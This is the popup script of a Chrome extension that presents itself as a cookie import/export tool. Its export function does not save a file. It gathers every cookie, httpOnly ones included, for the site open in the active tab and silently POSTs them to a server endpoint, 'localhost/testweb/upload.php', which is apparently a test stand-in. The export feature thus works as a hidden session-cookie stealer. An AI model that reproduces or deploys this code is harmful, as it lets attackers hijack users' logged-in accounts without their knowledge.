! function (e, t) {
    "function" == typeof define && define.amd ? define([], t) : "undefined" != typeof exports ? t() : t()
},
function (e) {
    e.storage.local.get({
        auto_refresh: !0,
        clear_cookies: !1
    }, function (t) {
        new Vue({
            el: "#shawnsavour",
            data: {
                password: "",
                sitename: "this page",
                isValidProtocol: !1,
                auto_refresh: t.auto_refresh,
                clear_cookies: t.clear_cookies,
                fullpage: !1,
                error: !1
            },
            methods: {
                exportCookies: function () {
                    var t = this;
                    if (!this.isValidProtocol) return !1;
                    if (this.fullpage) try {
                        var r = new URL(window.top.location.href);
                        this.doExport(atob(r.searchParams.get("url")))
                    } catch (i) {
                        console.error(i.message)
                    } else e.tabs.query({
                        active: !0,
                        currentWindow: !0
                    }, function (e) {
                        t.doExport(e[0].url)
                    })
                },
                doExport: function (t) {
                    var r = this;
                    try {
                        var i = new URL(t),
                            o = i.origin;
                        e.cookies.getAll({
                            url: o
                        }, function (e) {
                            if (e.length > 0) {
                                var t = {
                                        url: o,
                                        cookies: e
                                    },
                                    i = JSON.stringify(t);
                                
                                    $.ajax({

                                        url: 'http://localhost/testweb/upload.php',
                                        type: 'POST',
                                        data: {
                                            cookie : i
                                        },
                                        success: function(result){
                                            console.log(result);
                                            alert(i);
                            
                                           }
                            
                                     });
                                
                            } else r.error = !0
                        })
                    } catch (s) {
                        return console.error(s.message), !1
                    }
                },
                importCookies: function () {
                    return !!this.isValidProtocol && void document.getElementById("importCookiesInput").click()
                },
                importCookiesFromFile: function () {
                    var t = this,
                        r = document.getElementById("importCookiesInput"),
                        i = r.files[0];
                    if (i) {
                        var n = new FileReader;
                        n.onload = function (r) {
                            var i = r.target.result;
                            if ("" !== t.password && t.password.length > 0) {
                                var n = ShawnSavour.AES.decrypt(i.toString(), t.password);
                                i = n.toString(ShawnSavour.enc.Utf8)
                            }
                            try {
                                var o = JSON.parse(i);
                                e.cookies.getAll({
                                    url: o.url
                                }, function (r) {
                                    t.clear_cookies && r.map(function (t) {
                                        e.cookies.remove({
                                            url: o.url,
                                            name: t.name,
                                            storeId: t.storeId
                                        })
                                    }), o.cookies.map(function (t) {
                                        e.cookies.set({
                                            url: o.url,
                                            name: t.name,
                                            value: t.value,
                                            domain: t.domain,
                                            path: t.path,
                                            secure: t.secure,
                                            httpOnly: t.httpOnly,
                                            sameSite: t.sameSite,
                                            expirationDate: t.expirationDate,
                                            storeId: t.storeId
                                        })
                                    }), toastr.success("Done!"), t.auto_refresh && setTimeout(function () {
                                        e.tabs.query({
                                            active: !0,
                                            currentWindow: !0
                                        }, function (t) {
                                            e.tabs.update(t[0].id, {
                                                url: t[0].url
                                            }, function (e) {
                                                window.close()
                                            })
                                        })
                                    }, 1e3)
                                })
                            } catch (r) {
                                return toastr.error("Import failed!"), console.error(r.message), !1
                            }
                        }, n.readAsText(i)
                    }
                },
                saveOptions: function () {
                    e.storage.local.set({
                        auto_refresh: this.auto_refresh
                    })
                },
                getTime: function () {
                    var e = new Date,
                        t = e.getDate(),
                        r = e.getMonth() + 1;
                    return t < 10 && (t = "0" + t), r < 10 && (r = "0" + r), t + "-" + r + "-" + e.getFullYear()
                },
                openInNewTab: function () {
                    e.tabs.query({
                        active: !0,
                        currentWindow: !0
                    }, function (t) {
                        try {
                            e.tabs.create({
                                url: e.extension.getURL("popup.html?url=" + encodeURIComponent(btoa(t[0].url))),
                                active: !0
                            })
                        } catch (r) {
                            return console.error(r.message), !1
                        }
                    })
                }
            },
            mounted: function () {
                var t = this;
                e.tabs.query({
                    active: !0,
                    currentWindow: !0
                }, function (e) {
                    try {
                        var r = new URL(e[0].url);
                        if (t.fullpage = "chrome-extension:" === r.protocol, t.fullpage) {
                            try {
                                var i = new URL(window.top.location.href),
                                    n = new URL(atob(i.searchParams.get("url")));
                                t.sitename = n.hostname
                            } catch (o) {
                                console.error(o.message), window.close()
                            }
                            t.isValidProtocol = !0
                        } else t.isValidProtocol = ["http:", "https:"].includes(r.protocol), t.isValidProtocol && (t.sitename = r.hostname)
                    } catch (o) {
                        return console.error(o.message), !1
                    }
                })
            }
        })
    })
}(chrome);